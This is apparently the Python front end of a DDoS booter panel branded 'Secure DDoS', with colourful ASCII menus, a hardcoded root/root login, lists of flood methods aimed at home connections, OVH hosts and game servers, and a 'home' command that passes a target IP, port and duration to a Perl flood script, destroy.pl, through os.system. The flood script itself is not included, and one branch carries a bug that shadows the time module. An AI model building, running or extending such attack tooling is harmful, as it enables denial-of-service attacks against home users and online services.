import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
import datetime
from datetime import date
from time import sleep


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def l7():
    clear()
    print(f'''
\x1b[38;2;93;63;211m                            ╦ ╦  ╔╦╗ \x1b[38;2;191;64;191m ╔╦╗  \x1b[38;2;131;238;255m╔═╗  ╔═╗
\x1b[38;2;93;63;211m                            ╠═╣   ║  \x1b[38;2;191;64;191m  ║   \x1b[38;2;131;238;255m╠═╝  ╚═╗
\x1b[38;2;93;63;211m                            ╩ ╩   ╩  \x1b[38;2;191;64;191m  ╩   \x1b[38;2;131;238;255m╩    ╚═╝
\x1b[38;2;93;63;211m                                  
\x1b[38;2;93;63;211m             ╚══╦═══════════════════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m════════════════════╦══╝
\x1b[38;2;93;63;211m            ╔═══╩════════════╗═╔════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m═════╗═╔════════════╩═══╗
\x1b[38;2;93;63;211m            ║ CF-BYPASS      ║S║ BRO\x1b[38;2;191;64;191mWSER-CL\x1b[38;2;131;238;255mD    ║E║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ║ DSTAT-SLAP     ║E║ HTT\x1b[38;2;191;64;191mPS     \x1b[38;2;131;238;255m     ║R║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ║ HTTP-GOD       ║C║ XXX\x1b[38;2;191;64;191mXXXXXXX\x1b[38;2;131;238;255mXXXX ║U║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ║ BROWSER-CLAP   ║U║ XXX\x1b[38;2;191;64;191mXXXXXXX\x1b[38;2;131;238;255mXXXX ║C║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ║ SECURE-SPECIAL ║R║ XXX\x1b[38;2;191;64;191mXXXXXXX\x1b[38;2;131;238;255mXXXX ║E║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ║ XXXXXXXXXXXXXX ║E║ XXX\x1b[38;2;191;64;191mXXXXXXX\x1b[38;2;131;238;255mXXXX ║S║ XXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m            ╚════════════════╝═╚════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m═════╝═╚════════════════╝
        ''')

def layer4():
    clear()
    print(f'''
\x1b[38;2;93;63;211m                      ╔╦╗  ╔═╗  ╔═╗  ╔\x1b[38;2;191;64;191m═╗  ╦ ╦\x1b[38;2;131;238;255m  ╦    ╔╦╗
\x1b[38;2;93;63;211m                       ║║  ║╣   ╠╣   ╠\x1b[38;2;191;64;191m═╣  ║ ║\x1b[38;2;131;238;255m  ║     ║
\x1b[38;2;93;63;211m                      ═╩╝  ╚═╝  ╚    ╩\x1b[38;2;191;64;191m ╩  ╚═╝\x1b[38;2;131;238;255m  ╩═╝   ╩
\x1b[38;2;93;63;211m                                
\x1b[38;2;93;63;211m            ╚══╦══════════════════════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m═══════════════════╦══╝
\x1b[38;2;93;63;211m           ╔═══╩════════════╗═╔═══════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m══╗═╔══════════════╩═══╗
\x1b[38;2;93;63;211m           ║ HOME           ║S║ OVH-V2\x1b[38;2;191;64;191m       \x1b[38;2;131;238;255m  ║E║ UDP              ║
\x1b[38;2;93;63;211m           ║ HOME-RAIL      ║E║ OVH-UD\x1b[38;2;191;64;191mP      \x1b[38;2;131;238;255m  ║S║ UDPPLAIN         ║
\x1b[38;2;93;63;211m           ║ HOME-HOLD      ║C║ OVH   \x1b[38;2;191;64;191m       \x1b[38;2;131;238;255m  ║E║ TCP              ║
\x1b[38;2;93;63;211m           ║ HOME-SLAM      ║U║ OVH-TC\x1b[38;2;191;64;191mP      \x1b[38;2;131;238;255m  ║C║ XXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ╔╩════════════════╣═╠═══════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m══╣═╠══════════════════╩╗
\x1b[38;2;93;63;211m          ║ R6              ║R║ OVH-KI\x1b[38;2;191;64;191mLL     \x1b[38;2;131;238;255m  ║U║ TCP-KILL          ║
\x1b[38;2;93;63;211m          ║ GAME            ║E║ XXXXXX\x1b[38;2;191;64;191mXXXX   \x1b[38;2;131;238;255m  ║R║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ║ XXXXXXXXXXXXXXX ║S║ SOCKET\x1b[38;2;191;64;191m-DROP  \x1b[38;2;131;238;255m  ║E║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ║ XXXXXXXXXXXXXXX ║E║ XXX   \x1b[38;2;191;64;191m       \x1b[38;2;131;238;255m  ║.║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ║ XXXXXXXXXXXXXXX ║C║ XXXXXX\x1b[38;2;191;64;191mX      \x1b[38;2;131;238;255m  ║J║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ║ MINECRAFT       ║U║ HYDRA-\x1b[38;2;191;64;191mSEC    \x1b[38;2;131;238;255m  ║S║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ║ ROBLOX          ║R║ RAIL-S\x1b[38;2;191;64;191mEC     \x1b[38;2;131;238;255m  ║ ║ XXXXXXXXXXXXXXXXX ║
\x1b[38;2;93;63;211m          ╚═════════════════╝═╚═══════\x1b[38;2;191;64;191m═══════\x1b[38;2;131;238;255m══╝═╚═══════════════════╝
        ''')

def lol():
	clear()
	print(f'''
\x1b[38;2;93;63;211m
\x1b[38;2;93;63;211m                               ╔═╗╔═╗╔\x1b[38;2;191;64;191m═╗╦ ╦╦\x1b[38;2;131;238;255m═╗╔═╗
\x1b[38;2;93;63;211m                               ╚═╗║╣ ║\x1b[38;2;191;64;191m  ║ ║╠\x1b[38;2;131;238;255m╦╝║╣ 
\x1b[38;2;93;63;211m                               ╚═╝╚═╝╚\x1b[38;2;191;64;191m═╝╚═╝╩\x1b[38;2;131;238;255m╚═╚═╝
\x1b[38;2;93;63;211m                                      \x1b[38;2;191;64;191m      \x1b[38;2;131;238;255m
\x1b[38;2;93;63;211m               ══════╦════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m═══════════╦══════
\x1b[38;2;93;63;211m            ╔════════╩════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m═══════════╩════════╗
\x1b[38;2;93;63;211m            ║ Clear                \033[31m>  \x1b[38;2;191;64;191mClears your terminal. \x1b[38;2;131;238;255m    ║
\x1b[38;2;93;63;211m            ║ L4                   \033[31m>  \x1b[38;2;191;64;191mShows all L4 methods. \x1b[38;2;131;238;255m    ║
\x1b[38;2;93;63;211m            ║ L7                   \033[31m>  \x1b[38;2;191;64;191mShows all L7 methods. \x1b[38;2;131;238;255m    ║
\x1b[38;2;93;63;211m            ║ Rules                \033[31m>  \x1b[38;2;191;64;191mShows the Rules.      \x1b[38;2;131;238;255m    ║
\x1b[38;2;93;63;211m            ╚═════════════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2;Secure DoS --> Living: [{bots}] | Online Users: [1] | API: [UNDER-CONSTRUCTION] | Bypasses [12]\x07")
    clear()
    print(f'''
\x1b[38;2;93;63;211m
\x1b[38;2;93;63;211m                               ╔═╗╔═╗╔\x1b[38;2;191;64;191m═╗╦ ╦╦\x1b[38;2;131;238;255m═╗╔═╗
\x1b[38;2;93;63;211m                               ╚═╗║╣ ║\x1b[38;2;191;64;191m  ║ ║╠\x1b[38;2;131;238;255m╦╝║╣ 
\x1b[38;2;93;63;211m                               ╚═╝╚═╝╚\x1b[38;2;191;64;191m═╝╚═╝╩\x1b[38;2;131;238;255m╚═╚═╝
\x1b[38;2;93;63;211m                                      \x1b[38;2;191;64;191m      \x1b[38;2;131;238;255m
\x1b[38;2;93;63;211m                 ══════╦══════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m═════════════╦══════
\x1b[38;2;93;63;211m              ╔════════╩══════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m═════════════╩════════╗
\x1b[38;2;93;63;211m              ║          Welcome to Se\x1b[38;2;191;64;191mcure's\x1b[38;2;131;238;255m Home Screen !        ║
\x1b[38;2;93;63;211m              ║            https://ins\x1b[38;2;191;64;191mtagram\x1b[38;2;131;238;255m.com/secure.js        ║
\x1b[38;2;93;63;211m              ╚═╦═════════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m════════════════════╦═╝
\x1b[38;2;93;63;211m                ╚═╦═══════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m══════════════════╦═╝
\x1b[38;2;93;63;211m              ╔═══╩═══════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m══════════════════╩═══╗
\x1b[38;2;93;63;211m              ║    Type [HELP] To ge\x1b[38;2;191;64;191mt star\x1b[38;2;131;238;255mted with Secure.        ║
\x1b[38;2;93;63;211m              ║   Copyright © 2022 Sec\x1b[38;2;191;64;191mure AL\x1b[38;2;131;238;255mL Right's reserved.   ║
\x1b[38;2;93;63;211m              ╚═══════════════════════\x1b[38;2;191;64;191m══════\x1b[38;2;131;238;255m══════════════════════╝
''')

#MAIN
def main():
  menu()
  while(True):
    cnc = input('''\x1b[38;2;93;63;211m╔══[root@\x1b[38;2;191;64;191mSec\x1b[38;2;131;238;255mure
╚═\x1b[38;2;93;63;211m═\x1b[38;2;191;64;191m═\x1b[38;2;131;238;255m═>\x1b[38;2;233;233;233m ''')
    if ".gov" in cnc:
        exit()
    if cnc == "methods" or cnc == "METHODS" or cnc == "?":
        methods()
    elif cnc == "l4" or cnc == "L4":
        layer4()
    elif cnc == "l7" or cnc == "L7":
        l7()
    elif cnc == "help" or cnc == "HELP":
        lol()
    elif cnc == "back" or cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls" or cnc == "BACK":
        main()
    elif cnc == "rules" or cnc == "RULES":
    	print("1. No Spamming Attacks!")
    	print("2. No Attacking .gov.")
    	print("3. No double conning.")
    	print("4. No Selling without permission.")
    	time.sleep(3)
    	main()

    elif "home" in cnc:
        try:
            ip = cnc.split()[1]
            port = cnc.split()[2]
            time = cnc.split()[3]
            if int(time) > 600:
                print("Failed Attack To Long Of Time!")
                time.sleep(2.50)
                main()
            #CONTINUE
            os.system(f'cd API && perl destroy.pl {ip} {port} 65500 {time}')
        except IndexError:
            print('Usage: home <ip> <port> <time>')
            print('Example: home 1.1.1.1 80 60')


def login():
    clear()
    user = "root"
    passwd = "root"
    username = input("\033[31m \033[mUsername: ")
    password = getpass.getpass(prompt='\033[31m \033[mPassword: ')
    if username != user or password != passwd:
        print("")
        print("\033[33m🔥 \033[mInvalid")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\033[31m \033[mWelcome to Secure DDoS")
        time.sleep(1)
        ascii_vro()
        main()

login()
